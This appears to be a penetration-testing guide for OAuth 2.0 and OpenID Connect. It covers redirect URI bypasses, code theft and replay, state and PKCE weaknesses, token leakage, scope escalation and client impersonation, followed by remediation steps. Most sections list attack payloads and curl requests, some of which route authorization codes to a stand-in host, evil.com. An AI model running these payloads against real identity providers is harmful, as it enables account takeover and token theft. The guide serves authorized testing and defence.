# OAuth 2.0 Attack Testing

## Overview
OAuth 2.0 is the dominant authorization framework for API access delegation, but its complexity and numerous grant types create a broad attack surface. Misconfigurations in redirect URI validation, state parameter usage, token handling, and scope enforcement can lead to authorization code theft, account takeover, and unauthorized API access. This skill covers testing OAuth 2.0 and OpenID Connect implementations for security weaknesses.

## Classification
- **CWE:** CWE-601 (URL Redirection to Untrusted Site), CWE-352 (Cross-Site Request Forgery), CWE-522 (Insufficiently Protected Credentials), CWE-863 (Incorrect Authorization)
- **OWASP:** A07:2021 - Identification and Authentication Failures, A01:2021 - Broken Access Control
- **CVSS Base:** 6.1 - 9.8 (Medium to Critical)
- **MITRE ATT&CK:** T1528 (Steal Application Access Token), T1550.001 (Use Alternate Authentication Material: Application Access Token)

## Detection Methodology

### 1. Redirect URI Manipulation
The most impactful OAuth attack vector. Test redirect_uri validation:
```
# Exact match bypass
redirect_uri=https://legitimate.com.evil.com
redirect_uri=https://legitimate.com@evil.com
redirect_uri=https://legitimate.com%40evil.com
redirect_uri=https://evil.com#@legitimate.com
redirect_uri=https://evil.com\.legitimate.com

# Path traversal
redirect_uri=https://legitimate.com/callback/../../../evil-path
redirect_uri=https://legitimate.com/callback/..%2f..%2f

# Subdomain variations
redirect_uri=https://evil.legitimate.com/callback
redirect_uri=https://legitimate.com.evil.com/callback

# Open redirect chaining
redirect_uri=https://legitimate.com/redirect?url=https://evil.com

# Parameter pollution
redirect_uri=https://legitimate.com/callback&redirect_uri=https://evil.com

# Scheme manipulation
redirect_uri=http://legitimate.com/callback    (downgrade to HTTP)
redirect_uri=javascript://legitimate.com/callback

# Fragment and path additions
redirect_uri=https://legitimate.com/callback#evil
redirect_uri=https://legitimate.com/callback?extra=param
redirect_uri=https://legitimate.com/callback/extra/path
```

### 2. Authorization Code Theft
```
# Intercept authorization code from:
- Referer header leakage (code in URL parameters)
- Browser history
- Server logs
- Open redirect on the callback page

# Race condition in code exchange
# Send code exchange request multiple times rapidly
POST /oauth/token
  grant_type=authorization_code&code=STOLEN_CODE&redirect_uri=...&client_id=...

# Code reuse: exchange the same code twice
# If the second request succeeds, code replay is possible
```

### 3. CSRF / State Parameter Attacks
```
# Missing state parameter
GET /oauth/authorize?response_type=code&client_id=xxx&redirect_uri=yyy
# If no state parameter required, attacker can:
# 1. Initiate OAuth flow
# 2. Get auth code
# 3. Craft URL with their code, send to victim
# 4. Victim's account linked to attacker's OAuth identity

# Weak state validation
state=1234                     (predictable)
state=                         (empty)
# Omit state parameter entirely and check if flow completes

# State fixation
# Reuse a valid state value across sessions
```

### 4. PKCE Bypass
```
# Test if PKCE is enforced
# Send token exchange WITHOUT code_verifier
POST /oauth/token
  grant_type=authorization_code&code=xxx&redirect_uri=yyy&client_id=zzz
  # Omit code_verifier — if token returned, PKCE not enforced

# Downgrade code_challenge_method
code_challenge_method=plain    (instead of S256)
# Then code_verifier = code_challenge (no hashing needed)

# Null/empty code_verifier
code_verifier=
code_verifier=null
```

### 5. Token Leakage
```
# Implicit flow token in URL fragment
https://app.com/callback#access_token=eyJ...&token_type=bearer
# Token exposed in browser history, Referer headers, logs

# Token in response body without TLS
# Check for HTTP (not HTTPS) token endpoints

# Token leakage via error pages
# Application error pages may display tokens in debug output

# Token in GET parameters
GET /api/resource?access_token=eyJ...
# Logged in web server access logs, proxy logs
```

### 6. Scope Manipulation
```
# Request elevated scopes
scope=read write admin
scope=openid profile email admin:full
scope=user:read user:write user:admin

# Scope upgrade after initial consent
# Re-authorize with additional scopes without user re-consent

# Access resources beyond granted scope
# If granted scope=read, attempt write operations
POST /api/v1/resource    (with read-only token)
DELETE /api/v1/resource  (with read-only token)
```

### 7. Client Impersonation and Token Endpoint Attacks
```
# Leaked client secrets — check source code, JS files, mobile app decompilation
# Public client acting as confidential — skip client_secret in token exchange

# Grant type confusion
POST /oauth/token
  grant_type=client_credentials    (instead of authorization_code)

# Refresh token abuse
POST /oauth/token
  grant_type=refresh_token&refresh_token=STOLEN_REFRESH_TOKEN

# Token exchange without client authentication — omit client_secret
```

### 8. OpenID Connect Specific
```
# ID token manipulation (see jwt-attacks skill)
# Discovery endpoint: GET /.well-known/openid-configuration
# UserInfo endpoint abuse with cross-client tokens
GET /oauth/userinfo
Authorization: Bearer <token_from_different_client>
```

## Tool Usage

### Burp Suite
```
# OAuth flow interception
1. Proxy the full OAuth flow
2. Identify all parameters (redirect_uri, state, code, scope)
3. Use Repeater to manipulate redirect_uri and state
4. Use Intruder for client_id and scope enumeration
```

### Manual cURL Testing
```bash
# Test redirect_uri bypass
curl -v "https://auth.target.com/oauth/authorize?response_type=code&client_id=ID&redirect_uri=https://evil.com/callback&scope=openid+profile&state=rand"

# Token exchange
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=authorization_code&code=AUTH_CODE&redirect_uri=https://app.com/callback&client_id=ID&client_secret=SECRET"

# Test refresh token
curl -X POST https://auth.target.com/oauth/token \
  -d "grant_type=refresh_token&refresh_token=REFRESH_TOKEN&client_id=ID"
```

### EsPReSSO (Burp Extension)
```
# Install from BApp Store; intercept and automatically test OAuth flows
```

## Remediation
1. **Strict redirect URI validation** -- exact string match only; never allow wildcards, open redirects, or partial matching
2. **Enforce state parameter** -- generate a cryptographically random state value, bind it to the user session, validate on callback
3. **Require PKCE** -- enforce code_challenge_method=S256 for all clients, especially public clients
4. **Deprecate implicit flow** -- use authorization code flow with PKCE instead
5. **Short-lived authorization codes** -- expire within 30-60 seconds, single-use, bound to client
6. **Secure token storage** -- never expose tokens in URLs, logs, or Referer headers
7. **Scope enforcement** -- validate scope at resource server for every request, not just at authorization
8. **Client authentication** -- enforce client_secret or mTLS for confidential clients
9. **Token binding** -- bind tokens to specific clients and sessions where possible
10. **Rotate refresh tokens** -- issue new refresh token on each use, revoke old one

## Evidence Collection
- Redirect URI bypass payloads that successfully received authorization codes
- Missing or weak state parameter validation with proof of CSRF
- PKCE bypass demonstrating token exchange without code_verifier
- Scope escalation results showing access beyond granted permissions
- Token leakage locations (URLs, headers, logs, JavaScript)
- OpenID Connect discovery document revealing configuration
- Full OAuth flow capture with annotated security issues
